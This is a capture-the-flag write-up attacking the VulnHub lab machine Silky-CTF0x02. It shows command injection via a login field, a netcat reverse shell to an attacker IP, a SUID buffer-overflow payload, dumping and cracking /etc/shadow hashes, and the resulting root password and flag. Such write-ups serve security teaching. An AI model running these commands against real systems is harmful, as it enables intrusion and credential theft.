# Silky-CTF0x02 Writeup  
###### Author: Anthony Criscione (arc32x)
###### (.ova available on VulnHub)


## Info Gathering

### nmap -p- -T4 -A -v silky
- **Open Ports**
  - 22: OpenSSH 7.4p1
  - 80: Apache httpd 2.4.25

### dirb http://silky
- **Found Directories**
  - http://silky/admin.php (CODE:200|SIZE:3702)
  - http://silky/index.html (CODE:200|SIZE:10701)
  - http://silky/server-status (CODE:403|SIZE:293)

### nikto -h http://silky
- **Found nothing of interest**

### nikto -h "http://silky/admin.php?username=&password="
- OSVDB-44056: /admin.php/sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.

### Manual SQLi
- **Found nothing of interest**

### Manual RCE
- **Found RCE in username field (login box or URL)**
- Ex: silky/admin.php?username=pwd; ls; id; uname -a; cat /etc/passwd&password=test123


## Exploitation

### Established nc reverse shell through RCE in username field
  - Attacker: nc -lvp 4444
  - Target: nc 192.168.56.102 4444 -e /bin/sh
  - Better terminal with python: python -c "import pty; pty.spawn('/bin/bash')"


## Privilege Escalation

### sudo -l
- **Found nothing of interest (password required)**

### find / -perm -u=s -type f 2>/dev/null
- **Found suspicious program w/ SUID bit set: /home/silky/cat_shadow**
  - Moved to /home/silky and attempted to run **./cat_shadow**; password required
  - Tried with test password to observe behavior:

    ```bash
    www-data@Silky-CTF0x02:/home/silky$ ./cat_shadow test123
    Trying to cat /etc/shadow
     Permisson denied! 
     0x00000000 != 0x496c5962
    www-data@Silky-CTF0x02:/home/silky$
    ```

### Program w/ SUID Bit Prints Shadow File
- Shadow file contains user passwords. Though a password is required to execute cat_shadow, **0x00000000 != 0x496c5962** suggests memory corruption (buffer overflow, etc.) might be possible to override the password and print the shadow file; while the SUID bit suggests we might be able to use the overflow to get a root shell directly through cat_shadow. Either should result in root access.

### Testing Buffer Overflow

```bash
www-data@Silky-CTF0x02:/home/silky$  
./cat_shadow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Trying to cat /etc/shadow
 Permisson denied! 
 0x41414141 != 0x496c5962
www-data@Silky-CTF0x02:/home/silky$ ./cat_shadow $(python -c "print 'A'*100")
Trying to cat /etc/shadow
 Permisson denied! 
 0x41414141 != 0x496c5962
```

- **Found Oveflow**
  - Passing a large number of A's in as the password input results in **0x41414141**, which is AAAA (41 is A when converted from hex to ASCII, see ASCII table with *man ascii*).
  - We need to push **0x496c5962** to this location as indicated in the output inequality. To do so, we need to know how big the buffer is (ie. where the overflow occurs), and use this to pad our input string before pushing the expected value.
- **Finding Buffer Size**
  - We can use a random pattern of characters to find the desired offset using Metasploit's *msf-pattern_create* and *msf-pattern_offset*.
    - Attacker: msf-pattern_create -l 100
      - Pattern returned:  
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    - Target:  
      ./cat_shadow Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
      - Target returned: 0x63413163 != 0x496c5962
    - Attacker: msf-pattern_offset -q 63413163
      - Offset returned: Exact match at offset 64
  - So we need to pad our input with 64 characters to overflow the buffer, and then push the expected value into the next location in memory (which is what's being compared to). This can easily be done with python.

### Exploiting Buffer Overflow
- We just need to execute cat_shadow with our exploit string provided as the input password. We know we need to pad the input with 64 A's to overflow the buffer. After that we just need to append the expected hex values. However, due to little-endianness, these values need to be pushed in reverse (maintaining bytes, or hex pairs). Python makes all of this simple:
  - Target: ./cat_shadow $(python -c "print 'A'*64 + '\\x62\\x59\\x6c\\x49'")
- Exploit successful! The target shadow file is printed to the terminal.

> Trying to read /etc/shadow  
> Succes  
> Printing...  
> root:$6$L69RL59x$ONQl06MP37LfjyFBGlQ5TYtdDqEZEe0yIZIuTHASQG/dgH3Te0fJII/Wtdbu0PA3D/RTxJURc.Ses60j0GFyF/:18012:0:99999:7:::  
> daemon:*:18012:0:99999:7:::  
> [redacted]  
> silky:$6$F0T5vQMg$BKnwGPZ17UHvqZLOVFVCUh6CrsZ5Eu8BLT1/uX3h44wtEoDt9qA2dYL04CMUXHw2Km9H.tttNiyaCHwQQ..2T0:18012:0:99999:7:::  
> mysql:!:18012:0:99999:7:::  
> sshd:*:18012:0:99999:7:::  

- We could obtain silky's password if we wanted, but may as well get root.

### Cracking root Password
- Copied shadow file contents to attacker machine for cracking (saved as *silky_shadow*). Also printed and copied contents of */etc/passwd* (saved as *silky_passwd*).
- **unshadow silky_passwd silky_shadow > silky_john**
- **john silky_john --wordlist=/usr/share/wordlists/rockyou.txt**
- After some time, the cracked password is returned:  
  **greygrey	(root)**


## Privilege Escalation
- Finally we can *su root* with password *greygrey*.


## Capturing the Flag
- *cd /root && ls*
- *cat flag.txt*
- Flag obtained: **d1f258a6ec26dffbbdec79f68890a5e8**
